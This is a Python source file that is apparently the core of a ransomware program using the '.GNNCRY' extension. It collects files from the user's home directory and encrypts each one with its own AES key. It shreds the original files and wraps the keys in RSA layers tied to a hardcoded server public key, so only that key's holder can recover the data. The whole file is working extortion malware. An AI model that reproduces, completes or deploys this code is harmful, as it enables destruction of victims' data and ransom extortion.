import base64
import pickle
import gc

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

import variables
import asymmetric
import get_files
import symmetric
import generate_keys
import utils


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i + n] for i in range(0, len(msg), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)

        found_file = base64.b64decode(found_file)

        try:
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        encrypted = AES_obj.encrypt(file_content)
        utils.shred(found_file)

        new_file_name = found_file.decode('utf-8') + ".GNNCRY"
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name)

        AES_and_base64_path.append((key, base64_new_file_name))
    return AES_and_base64_path


def menu():
    files = get_files.find_files(variables.home)

    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()

    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key)

    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)

    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)

    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()

    client_public_key_object = RSA.importKey(Client_public_key)
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)

    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))

    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


if __name__ == "__main__":
    menu()